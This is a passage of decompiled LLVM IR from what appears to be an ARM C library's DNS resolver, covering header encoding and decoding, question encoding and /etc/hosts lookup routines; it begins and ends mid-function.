  %v3_17480 = load i32, i32* %v2_17480, align 4
  %. = select i1 %v2_17478, i32 0, i32 128
  %v2_1748c = icmp eq i32 %v3_17468, 0
  %storemerge11 = select i1 %v2_1748c, i32 0, i32 4
  %v2_17498 = or i32 %v5_1747c, %.
  %v2_1749c = icmp eq i32 %v3_17480, 0
  %.26 = select i1 %v2_1749c, i32 0, i32 2
  %v2_174a8 = or i32 %v2_17498, %storemerge11
  %v2_174ac = or i32 %v2_174a8, %.26
  %v1_174b0 = trunc i32 %v2_174ac to i8
  %v2_174b0 = load i32, i32* %lr.global-to-local, align 4
  %v3_174b0 = add i32 %v2_174b0, 2
  %v4_174b0 = inttoptr i32 %v3_174b0 to i8*
  store i8 %v1_174b0, i8* %v4_174b0, align 1
  %v0_174b4 = load i32, i32* @ip, align 4
  %v1_174b4 = add i32 %v0_174b4, 24
  %v1_174b8 = inttoptr i32 %v1_174b4 to i32*
  %v2_174b8 = load i32, i32* %v1_174b8, align 4
  %v3_174b8 = add i32 %v0_174b4, 28
  %v4_174b8 = inttoptr i32 %v3_174b8 to i32*
  %v5_174b8 = load i32, i32* %v4_174b8, align 4
  %v2_174bc = icmp eq i32 %v2_174b8, 0
  %v1_174c0 = urem i32 %v5_174b8, 16
  %v0_174cc = select i1 %v2_174bc, i32 0, i32 128
  %v2_174cc = or i32 %v1_174c0, %v0_174cc
  %v1_174d0 = trunc i32 %v2_174cc to i8
  %v2_174d0 = load i32, i32* %lr.global-to-local, align 4
  %v3_174d0 = add i32 %v2_174d0, 3
  %v4_174d0 = inttoptr i32 %v3_174d0 to i8*
  store i8 %v1_174d0, i8* %v4_174d0, align 1
  %v0_174d4 = load i32, i32* @ip, align 4
  %v1_174d4 = add i32 %v0_174d4, 33
  %v2_174d4 = inttoptr i32 %v1_174d4 to i8*
  %v3_174d4 = load i8, i8* %v2_174d4, align 1
  %v2_174d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_174d8 = add i32 %v2_174d8, 4
  %v4_174d8 = inttoptr i32 %v3_174d8 to i8*
  store i8 %v3_174d4, i8* %v4_174d8, align 1
  %v0_174dc = load i32, i32* @ip, align 4
  %v1_174dc = add i32 %v0_174dc, 32
  %v2_174dc = inttoptr i32 %v1_174dc to i32*
  %v3_174dc = load i32, i32* %v2_174dc, align 4
  %v1_174e0 = trunc i32 %v3_174dc to i8
  %v2_174e0 = load i32, i32* %lr.global-to-local, align 4
  %v3_174e0 = add i32 %v2_174e0, 5
  %v4_174e0 = inttoptr i32 %v3_174e0 to i8*
  store i8 %v1_174e0, i8* %v4_174e0, align 1
  %v0_174e4 = load i32, i32* @ip, align 4
  %v1_174e4 = add i32 %v0_174e4, 37
  %v2_174e4 = inttoptr i32 %v1_174e4 to i8*
  %v3_174e4 = load i8, i8* %v2_174e4, align 1
  %v2_174e8 = load i32, i32* %lr.global-to-local, align 4
  %v3_174e8 = add i32 %v2_174e8, 6
  %v4_174e8 = inttoptr i32 %v3_174e8 to i8*
  store i8 %v3_174e4, i8* %v4_174e8, align 1
  %v0_174ec = load i32, i32* @ip, align 4
  %v1_174ec = add i32 %v0_174ec, 36
  %v2_174ec = inttoptr i32 %v1_174ec to i32*
  %v3_174ec = load i32, i32* %v2_174ec, align 4
  %v1_174f0 = trunc i32 %v3_174ec to i8
  %v2_174f0 = load i32, i32* %lr.global-to-local, align 4
  %v3_174f0 = add i32 %v2_174f0, 7
  %v4_174f0 = inttoptr i32 %v3_174f0 to i8*
  store i8 %v1_174f0, i8* %v4_174f0, align 1
  %v0_174f4 = load i32, i32* @ip, align 4
  %v1_174f4 = add i32 %v0_174f4, 41
  %v2_174f4 = inttoptr i32 %v1_174f4 to i8*
  %v3_174f4 = load i8, i8* %v2_174f4, align 1
  %v2_174f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_174f8 = add i32 %v2_174f8, 8
  %v4_174f8 = inttoptr i32 %v3_174f8 to i8*
  store i8 %v3_174f4, i8* %v4_174f8, align 1
  %v0_174fc = load i32, i32* @ip, align 4
  %v1_174fc = add i32 %v0_174fc, 40
  %v2_174fc = inttoptr i32 %v1_174fc to i32*
  %v3_174fc = load i32, i32* %v2_174fc, align 4
  %v1_17500 = trunc i32 %v3_174fc to i8
  %v2_17500 = load i32, i32* %lr.global-to-local, align 4
  %v3_17500 = add i32 %v2_17500, 9
  %v4_17500 = inttoptr i32 %v3_17500 to i8*
  store i8 %v1_17500, i8* %v4_17500, align 1
  %v0_17504 = load i32, i32* @ip, align 4
  %v1_17504 = add i32 %v0_17504, 45
  %v2_17504 = inttoptr i32 %v1_17504 to i8*
  %v3_17504 = load i8, i8* %v2_17504, align 1
  %v2_17508 = load i32, i32* %lr.global-to-local, align 4
  %v3_17508 = add i32 %v2_17508, 10
  %v4_17508 = inttoptr i32 %v3_17508 to i8*
  store i8 %v3_17504, i8* %v4_17508, align 1
  %v0_1750c = load i32, i32* @ip, align 4
  %v1_1750c = add i32 %v0_1750c, 44
  %v2_1750c = inttoptr i32 %v1_1750c to i32*
  %v3_1750c = load i32, i32* %v2_1750c, align 4
  %v1_17510 = trunc i32 %v3_1750c to i8
  %v2_17510 = load i32, i32* %lr.global-to-local, align 4
  %v3_17510 = add i32 %v2_17510, 11
  %v4_17510 = inttoptr i32 %v3_17510 to i8*
  store i8 %v1_17510, i8* %v4_17510, align 1
  %v2_17518.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %entry, %bb17
  %v2_17518 = phi i32 [ %v2_17518.pre, %bb17 ], [ %v0_17438, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_17518, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1745c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 1, 2, 0, 3 }
  uselistorder i32 37, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17518, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_17520 = load i8, i8* %arg1, align 1
  %v4_17520 = zext i8 %v3_17520 to i32
  %v2_17524 = add i32 %tmp, 1
  %v3_17524 = inttoptr i32 %v2_17524 to i8*
  %v4_17524 = load i8, i8* %v3_17524, align 1
  %v5_17524 = zext i8 %v4_17524 to i32
  %v4_17528 = mul nuw nsw i32 %v4_17520, 256
  %v5_17528 = or i32 %v5_17524, %v4_17528
  %v2_1752c = inttoptr i32 %arg2 to i32*
  store i32 %v5_17528, i32* %v2_1752c, align 4
  %v2_17530 = add i32 %tmp, 2
  %v3_17530 = inttoptr i32 %v2_17530 to i8*
  %v4_17530 = load i8, i8* %v3_17530, align 1
  %tmp3 = icmp slt i8 %v4_17530, 0
  %v3_17534 = zext i1 %tmp3 to i32
  %v2_17538 = add i32 %arg2, 4
  %v3_17538 = inttoptr i32 %v2_17538 to i32*
  store i32 %v3_17534, i32* %v3_17538, align 4
  %v4_1753c = load i8, i8* %v3_17530, align 1
  %div = udiv i8 %v4_1753c, 8
  %tmp4 = urem i8 %div, 16
  %v1_17544 = zext i8 %tmp4 to i32
  %v2_17548 = add i32 %arg2, 8
  %v3_17548 = inttoptr i32 %v2_17548 to i32*
  store i32 %v1_17544, i32* %v3_17548, align 4
  %v4_1754c = load i8, i8* %v3_17530, align 1
  %div1 = udiv i8 %v4_1754c, 4
  %tmp5 = urem i8 %div1, 2
  %v1_17554 = zext i8 %tmp5 to i32
  %v2_17558 = add i32 %arg2, 12
  %v3_17558 = inttoptr i32 %v2_17558 to i32*
  store i32 %v1_17554, i32* %v3_17558, align 4
  %v4_1755c = load i8, i8* %v3_17530, align 1
  %div2 = udiv i8 %v4_1755c, 2
  %tmp6 = urem i8 %div2, 2
  %v1_17564 = zext i8 %tmp6 to i32
  %v2_17568 = add i32 %arg2, 16
  %v3_17568 = inttoptr i32 %v2_17568 to i32*
  store i32 %v1_17564, i32* %v3_17568, align 4
  %v4_1756c = load i8, i8* %v3_17530, align 1
  %tmp7 = urem i8 %v4_1756c, 2
  %v1_17570 = zext i8 %tmp7 to i32
  %v2_17574 = add i32 %arg2, 20
  %v3_17574 = inttoptr i32 %v2_17574 to i32*
  store i32 %v1_17570, i32* %v3_17574, align 4
  %v2_17578 = add i32 %tmp, 3
  %v3_17578 = inttoptr i32 %v2_17578 to i8*
  %v4_17578 = load i8, i8* %v3_17578, align 1
  %tmp8 = icmp slt i8 %v4_17578, 0
  %v3_1757c = zext i1 %tmp8 to i32
  %v2_17580 = add i32 %arg2, 24
  %v3_17580 = inttoptr i32 %v2_17580 to i32*
  store i32 %v3_1757c, i32* %v3_17580, align 4
  %v4_17584 = load i8, i8* %v3_17578, align 1
  %tmp9 = urem i8 %v4_17584, 16
  %v1_17588 = zext i8 %tmp9 to i32
  %v2_1758c = add i32 %arg2, 28
  %v3_1758c = inttoptr i32 %v2_1758c to i32*
  store i32 %v1_17588, i32* %v3_1758c, align 4
  %v2_17590 = add i32 %tmp, 4
  %v3_17590 = inttoptr i32 %v2_17590 to i8*
  %v4_17590 = load i8, i8* %v3_17590, align 1
  %v5_17590 = zext i8 %v4_17590 to i32
  %v2_17594 = add i32 %tmp, 5
  %v3_17594 = inttoptr i32 %v2_17594 to i8*
  %v4_17594 = load i8, i8* %v3_17594, align 1
  %v5_17594 = zext i8 %v4_17594 to i32
  %v4_17598 = mul nuw nsw i32 %v5_17590, 256
  %v5_17598 = or i32 %v5_17594, %v4_17598
  %v2_1759c = add i32 %arg2, 32
  %v3_1759c = inttoptr i32 %v2_1759c to i32*
  store i32 %v5_17598, i32* %v3_1759c, align 4
  %v2_175a0 = add i32 %tmp, 6
  %v3_175a0 = inttoptr i32 %v2_175a0 to i8*
  %v4_175a0 = load i8, i8* %v3_175a0, align 1
  %v5_175a0 = zext i8 %v4_175a0 to i32
  %v2_175a4 = add i32 %tmp, 7
  %v3_175a4 = inttoptr i32 %v2_175a4 to i8*
  %v4_175a4 = load i8, i8* %v3_175a4, align 1
  %v5_175a4 = zext i8 %v4_175a4 to i32
  %v4_175a8 = mul nuw nsw i32 %v5_175a0, 256
  %v5_175a8 = or i32 %v5_175a4, %v4_175a8
  %v2_175ac = add i32 %arg2, 36
  %v3_175ac = inttoptr i32 %v2_175ac to i32*
  store i32 %v5_175a8, i32* %v3_175ac, align 4
  %v2_175b0 = add i32 %tmp, 8
  %v3_175b0 = inttoptr i32 %v2_175b0 to i8*
  %v4_175b0 = load i8, i8* %v3_175b0, align 1
  %v5_175b0 = zext i8 %v4_175b0 to i32
  %v2_175b4 = add i32 %tmp, 9
  %v3_175b4 = inttoptr i32 %v2_175b4 to i8*
  %v4_175b4 = load i8, i8* %v3_175b4, align 1
  %v5_175b4 = zext i8 %v4_175b4 to i32
  %v4_175b8 = mul nuw nsw i32 %v5_175b0, 256
  %v5_175b8 = or i32 %v5_175b4, %v4_175b8
  %v2_175bc = add i32 %arg2, 40
  %v3_175bc = inttoptr i32 %v2_175bc to i32*
  store i32 %v5_175b8, i32* %v3_175bc, align 4
  %v2_175c0 = add i32 %tmp, 11
  %v3_175c0 = inttoptr i32 %v2_175c0 to i8*
  %v4_175c0 = load i8, i8* %v3_175c0, align 1
  %v5_175c0 = zext i8 %v4_175c0 to i32
  %v2_175c4 = add i32 %tmp, 10
  %v3_175c4 = inttoptr i32 %v2_175c4 to i8*
  %v4_175c4 = load i8, i8* %v3_175c4, align 1
  %v5_175c4 = zext i8 %v4_175c4 to i32
  %v4_175c8 = mul nuw nsw i32 %v5_175c4, 256
  %v5_175c8 = or i32 %v4_175c8, %v5_175c0
  %v2_175cc = add i32 %arg2, 44
  %v3_175cc = inttoptr i32 %v2_175cc to i32*
  store i32 %v5_175c8, i32* %v3_175cc, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 11, { 10, 11, 4, 5, 7, 8, 9, 14, 12, 13, 15, 1, 2, 3, 16, 17, 18, 19, 20, 21, 0, 6 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5, 12 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_175d4 = load i32, i32* @r4, align 4
  store i32 %v3_175d4, i32* %stack_var_-16, align 4
  %v9_175d4 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_175dc = load i32, i32* %arg1, align 4
  store i32 %v2_175dc, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_175e8 = inttoptr i32 %v2_175dc to i8*
  %v2_175e8 = call i32 @__encode_dotted(i8* %v1_175e8)
  store i32 %v2_175e8, i32* %r0.global-to-local, align 4
  %v1_175ec = icmp slt i32 %v2_175e8, 0
  br i1 %v1_175ec, label %dec_label_pc_1762c, label %dec_label_pc_175f4

dec_label_pc_175f4:                               ; preds = %entry
  %v1_175f4 = load i32, i32* @r5, align 4
  %v2_175f4 = sub i32 %v1_175f4, %v2_175e8
  %v7_175fc = icmp slt i32 %v2_175f4, 4
  br i1 %v7_175fc, label %bb, label %dec_label_pc_17604

bb:                                               ; preds = %dec_label_pc_175f4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1762c

dec_label_pc_17604:                               ; preds = %dec_label_pc_175f4
  %v0_17604 = load i32, i32* @r4, align 4
  %v1_17604 = add i32 %v0_17604, 5
  %v2_17604 = inttoptr i32 %v1_17604 to i8*
  %v3_17604 = load i8, i8* %v2_17604, align 1
  %v2_17608 = load i32, i32* @r6, align 4
  %v4_17608 = add i32 %v2_17608, %v2_175e8
  %v5_17608 = inttoptr i32 %v4_17608 to i8*
  store i8 %v3_17604, i8* %v5_17608, align 1
  %v0_1760c = load i32, i32* @r4, align 4
  %v1_1760c = add i32 %v0_1760c, 4
  %v2_1760c = inttoptr i32 %v1_1760c to i32*
  %v3_1760c = load i32, i32* %v2_1760c, align 4
  %v0_17610 = load i32, i32* @r6, align 4
  %v1_17610 = load i32, i32* %r0.global-to-local, align 4
  %v2_17610 = add i32 %v1_17610, %v0_17610
  store i32 %v2_17610, i32* %r2.global-to-local, align 4
  %v1_17614 = trunc i32 %v3_1760c to i8
  %v3_17614 = add i32 %v2_17610, 1
  %v4_17614 = inttoptr i32 %v3_17614 to i8*
  store i8 %v1_17614, i8* %v4_17614, align 1
  %v0_17618 = load i32, i32* @r4, align 4
  %v1_17618 = add i32 %v0_17618, 9
  %v2_17618 = inttoptr i32 %v1_17618 to i8*
  %v3_17618 = load i8, i8* %v2_17618, align 1
  %v2_1761c = load i32, i32* %r2.global-to-local, align 4
  %v3_1761c = add i32 %v2_1761c, 2
  %v4_1761c = inttoptr i32 %v3_1761c to i8*
  store i8 %v3_17618, i8* %v4_1761c, align 1
  %v0_17620 = load i32, i32* @r4, align 4
  %v1_17620 = add i32 %v0_17620, 8
  %v2_17620 = inttoptr i32 %v1_17620 to i32*
  %v3_17620 = load i32, i32* %v2_17620, align 4
  %v1_17624 = trunc i32 %v3_17620 to i8
  %v2_17624 = load i32, i32* %r2.global-to-local, align 4
  %v3_17624 = add i32 %v2_17624, 3
  %v4_17624 = inttoptr i32 %v3_17624 to i8*
  store i8 %v1_17624, i8* %v4_17624, align 1
  %v0_17628 = load i32, i32* %r0.global-to-local, align 4
  %v1_17628 = add i32 %v0_17628, 4
  store i32 %v1_17628, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1762c

dec_label_pc_1762c:                               ; preds = %bb, %entry, %dec_label_pc_17604
  %v1_17630 = phi i32 [ -1, %bb ], [ %v2_175e8, %entry ], [ %v1_17628, %dec_label_pc_17604 ]
  %v2_1762c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1762c, i32* @r4, align 4
  store i32 %v9_175d4, i32* @r6, align 4
  ret i32 %v1_17630

; uselistorder directives
  uselistorder i32 %v2_175e8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder label %dec_label_pc_1762c, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -33900), i32* @r0, align 4
  %v1_1764c = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -33900))
  ret i32 %v1_1764c

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_17664 = load i32, i32* @r4, align 4
  %v9_17664 = load i32, i32* @r6, align 4
  %v12_17664 = load i32, i32* @r7, align 4
  %v15_17664 = load i32, i32* @r8, align 4
  %v18_17664 = load i32, i32* @sb, align 4
  %v24_17664 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  %v2_17684 = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_17684, align 4
  %v0_17688 = load i32, i32* @r0, align 4
  store i32 %v0_17688, i32* @r6, align 4
  %v0_1768c = load i32, i32* @r1, align 4
  %v0_17690 = load i32, i32* @r2, align 4
  store i32 %v0_17690, i32* @r8, align 4
  %v0_17694 = load i32, i32* @r3, align 4
  store i32 %v0_17694, i32* @fp, align 4
  %v3_17698 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_17698, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_176a4

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1785c

dec_label_pc_176a4:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_176a8 = icmp eq i32 %v0_17688, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_176a8, label %dec_label_pc_176b4, label %dec_label_pc_176dc

dec_label_pc_176b4:                               ; preds = %dec_label_pc_176a4
  %v0_176b4 = call i32 @__open_etc_hosts()
  store i32 %v0_176b4, i32* @r6, align 4
  %v2_176b8 = icmp eq i32 %v0_176b4, 0
  br i1 %v2_176b8, label %dec_label_pc_176c0, label %dec_label_pc_176dc

dec_label_pc_176c0:                               ; preds = %dec_label_pc_176b4
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  store i32 51608, i32* %r3.global-to-local, align 4
  %v2_176c8 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_176c8, align 4
  %v0_176cc = call i32 @__aeabi_read_tp()
  %v3_176d0 = load i16, i16* @global_var_24070.401, align 2
  %v4_176d0 = sext i16 %v3_176d0 to i32
  store i32 %v4_176d0, i32* %r3.global-to-local, align 4
  %v2_176d4 = add i32 %v4_176d0, %v0_176cc
  %v3_176d4 = inttoptr i32 %v2_176d4 to i32*
  %v4_176d4 = load i32, i32* %v3_176d4, align 4
  store i32 %v4_176d4, i32* @sb, align 4
  br label %dec_label_pc_1785c

dec_label_pc_176dc:                               ; preds = %dec_label_pc_176b4, %dec_label_pc_176a4
  %v1_176fc = phi i32 [ %v0_176b4, %dec_label_pc_176b4 ], [ %v0_17688, %dec_label_pc_176a4 ]
  %v0_176e0 = load i32, i32* @r4, align 4
  %v2_176e0 = add i32 %v0_176e0, -33888
  store i32 %v2_176e0, i32* @r4, align 4
  %v2_176e4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_176fc = add i32 %v1_176fc, 8
  %v3_176fc = inttoptr i32 %v2_176fc to i32*
  store i32 48, i32* %v3_176fc, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_17704 = load i32, i32* @r5, align 4
  %v1_17704 = add i32 %v0_17704, -48
  %v0_17708 = load i32, i32* %ip.global-to-local, align 4
  %v1_17708 = add i32 %v0_17708, 24
  store i32 %v1_17708, i32* @ip, align 4
  %v0_1770c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1770c, i32* @sb, align 4
  %v0_17710 = load i32, i32* @lr, align 4
  %v1_17710 = add i32 %v0_17710, 32
  store i32 %v1_17710, i32* @sl, align 4
  %v1_17714 = load i32, i32* @r6, align 4
  %v2_17714 = add i32 %v1_17714, 16
  %v3_17714 = inttoptr i32 %v2_17714 to i32*
  store i32 %v1_17704, i32* %v3_17714, align 4
  %v0_17718 = load i32, i32* @r4, align 4
  %v0_1771c = load i32, i32* @ip, align 4
  store i32 %v0_1771c, i32* %stack_var_-64, align 4
  %v0_17720 = load i32, i32* %r2.global-to-local, align 4
  %v1_17720 = load i32, i32* %r3.global-to-local, align 4
  %v2_17720 = inttoptr i32 %v1_17720 to i32*
  store i32 %v0_17720, i32* %v2_17720, align 4
  %v0_17724 = load i32, i32* @lr, align 4
  %v1_17724 = load i32, i32* @r6, align 4
  %v2_17724 = add i32 %v1_17724, 4
  %v3_17724 = inttoptr i32 %v2_17724 to i32*
  store i32 %v0_17724, i32* %v3_17724, align 4
  %v2_17754 = inttoptr i32 %v0_1768c to i8*
  br label %dec_label_pc_17830

dec_label_pc_1772c:                               ; preds = %dec_label_pc_17830
  %v3_1772c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1772c, i32* @r1, align 4
  %v0_17730 = load i32, i32* @fp, align 4
  %v7_17730 = icmp eq i32 %v0_17730, 1
  %v1_17734 = add i32 %v3_1772c, 4
  store i32 %v1_17734, i32* @r5, align 4
  %v1_17738 = load i32, i32* @r7, align 4
  %v2_17738 = add i32 %v1_17738, 4
  %v3_17738 = inttoptr i32 %v2_17738 to i32*
  store i32 %v1_17734, i32* %v3_17738, align 4
  br i1 %v7_17730, label %dec_label_pc_1785c, label %dec_label_pc_17740

dec_label_pc_17740:                               ; preds = %dec_label_pc_1772c
  %v0_17740 = load i32, i32* @fp, align 4
  %v7_17740 = icmp eq i32 %v0_17740, 2
  br i1 %v7_17740, label %dec_label_pc_1774c, label %dec_label_pc_17780.preheader

dec_label_pc_17780.preheader:                     ; preds = %dec_label_pc_17740
  br label %dec_label_pc_17764

dec_label_pc_1774c:                               ; preds = %dec_label_pc_17740
  %v0_1774c = load i32, i32* @r1, align 4
  %v1_1774c = inttoptr i32 %v0_1774c to i32*
  %v2_1774c = load i32, i32* %v1_1774c, align 4
  store i32 %v2_1774c, i32* @r1, align 4
  %v3_17754 = call i32 @__GI_strcoll(i8* %v2_17754, i32 %v2_1774c)
  %v2_17758 = icmp eq i32 %v3_17754, 0
  br i1 %v2_17758, label %dec_label_pc_17790, label %dec_label_pc_17830

dec_label_pc_17764:                               ; preds = %dec_label_pc_17780.preheader, %dec_label_pc_17780.backedge
  %v0_1776c = phi i32 [ 0, %dec_label_pc_17780.preheader ], [ %v0_17780.be, %dec_label_pc_17780.backedge ]
  %v0_17764 = load i32, i32* @r5, align 4
  %v4_17764 = mul i32 %v0_1776c, 4
  %v5_17764 = add i32 %v4_17764, %v0_17764
  %v6_17764 = inttoptr i32 %v5_17764 to i32*
  %v7_17764 = load i32, i32* %v6_17764, align 4
  store i32 %v7_17764, i32* %r3.global-to-local, align 4
  %v2_17768 = icmp eq i32 %v7_17764, 0
  %v1_1776c = add i32 %v0_1776c, 1
  store i32 %v1_1776c, i32* @r4, align 4
  br i1 %v2_17768, label %dec_label_pc_17780.backedge, label %dec_label_pc_17774

dec_label_pc_17780.backedge:                      ; preds = %dec_label_pc_17764, %dec_label_pc_17780thread-pre-split
  %v0_17780.be = phi i32 [ %v0_17780.pr, %dec_label_pc_17780thread-pre-split ], [ %v1_1776c, %dec_label_pc_17764 ]
  %v7_17788 = icmp sgt i32 %v0_17780.be, 3
  br i1 %v7_17788, label %dec_label_pc_17830, label %dec_label_pc_17764

dec_label_pc_17774:                               ; preds = %dec_label_pc_17764
  %v3_17774 = call i32 @__GI_strcasecmp(i8* %v2_17754, i32 %v7_17764)
  %v2_17778 = icmp eq i32 %v3_17774, 0
  br i1 %v2_17778, label %dec_label_pc_17790, label %dec_label_pc_17780thread-pre-split

dec_label_pc_17780thread-pre-split:               ; preds = %dec_label_pc_17774
  %v0_17780.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_17780.backedge

dec_label_pc_17790:                               ; preds = %dec_label_pc_17774, %dec_label_pc_1774c
  %v0_17790 = load i32, i32* @r5, align 4
  %v1_17790 = inttoptr i32 %v0_17790 to i32*
  %v2_17790 = load i32, i32* %v1_17790, align 4
  store i32 %v2_17790, i32* %r3.global-to-local, align 4
  %v4_17790 = add i32 %v0_17790, 4
  store i32 %v4_17790, i32* @r5, align 4
  %v2_17794 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17794, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1779c = load i32, i32* @r7, align 4
  %v2_1779c = inttoptr i32 %v1_1779c to i32*
  store i32 %v2_17790, i32* %v2_1779c, align 4
  %v0_177a0 = load i32, i32* @lr, align 4
  %v1_177a0 = load i32, i32* @ip, align 4
  %v2_177a0 = add i32 %v1_177a0, 4
  %v3_177a0 = inttoptr i32 %v2_177a0 to i32*
  store i32 %v0_177a0, i32* %v3_177a0, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_177a8 = load i32, i32* @r8, align 4
  %v7_177a8 = icmp eq i32 %v0_177a8, 2
  %v0_177ac = load i32, i32* @r5, align 4
  %v1_177ac = load i32, i32* @r7, align 4
  %v2_177ac = add i32 %v1_177ac, 4
  %v3_177ac = inttoptr i32 %v2_177ac to i32*
  store i32 %v0_177ac, i32* %v3_177ac, align 4
  %v0_177b0 = load i32, i32* @ip, align 4
  %v1_177b0 = load i32, i32* @r7, align 4
  %v2_177b0 = add i32 %v1_177b0, 16
  %v3_177b0 = inttoptr i32 %v2_177b0 to i32*
  store i32 %v0_177b0, i32* %v3_177b0, align 4
  %v0_177b4 = load i32, i32* @sl, align 4
  %v1_177b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_177b4 = add i32 %v1_177b4, 24
  %v3_177b4 = inttoptr i32 %v2_177b4 to i32*
  store i32 %v0_177b4, i32* %v3_177b4, align 4
  br i1 %v7_177a8, label %dec_label_pc_177bc, label %dec_label_pc_177ec

dec_label_pc_177bc:                               ; preds = %dec_label_pc_17790
  %v3_177bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_177bc, i32* %r3.global-to-local, align 4
  %v0_177c0 = load i32, i32* @r8, align 4
  %v1_177c4 = inttoptr i32 %v3_177bc to i32*
  %v2_177c4 = load i32, i32* %v1_177c4, align 4
  %v0_177c8 = load i32, i32* @sl, align 4
  store i32 %v0_177c8, i32* %r2.global-to-local, align 4
  %v3_177cc = inttoptr i32 %v2_177c4 to i8*
  %v4_177cc = call i32 @inet_pton(i32 %v0_177c0, i8* %v3_177cc, i32 %v0_177c8)
  %tmp23 = icmp slt i32 %v4_177cc, 1
  br i1 %tmp23, label %dec_label_pc_1782c, label %dec_label_pc_177d8

dec_label_pc_177d8:                               ; preds = %dec_label_pc_177bc
  %v0_177dc = load i32, i32* @r7, align 4
  %v2_177dc = inttoptr i32 %tmp7 to i32*
  store i32 %v0_177dc, i32* %v2_177dc, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_177e4 = load i32, i32* @r8, align 4
  %v1_177e4 = load i32, i32* @r7, align 4
  %v2_177e4 = add i32 %v1_177e4, 8
  %v3_177e4 = inttoptr i32 %v2_177e4 to i32*
  store i32 %v0_177e4, i32* %v3_177e4, align 4
  %v0_17824.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17820

dec_label_pc_177ec:                               ; preds = %dec_label_pc_17790
  %v0_177ec = load i32, i32* @r8, align 4
  %v7_177ec = icmp eq i32 %v0_177ec, 10
  br i1 %v7_177ec, label %dec_label_pc_177f4, label %dec_label_pc_1782c

dec_label_pc_177f4:                               ; preds = %dec_label_pc_177ec
  %v3_177f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_177f4, i32* %r3.global-to-local, align 4
  %v1_177fc = inttoptr i32 %v3_177f4 to i32*
  %v2_177fc = load i32, i32* %v1_177fc, align 4
  %v0_17800 = load i32, i32* @sl, align 4
  store i32 %v0_17800, i32* %r2.global-to-local, align 4
  %v3_17804 = inttoptr i32 %v2_177fc to i8*
  %v4_17804 = call i32 @inet_pton(i32 10, i8* %v3_17804, i32 %v0_17800)
  %tmp24 = icmp slt i32 %v4_17804, 1
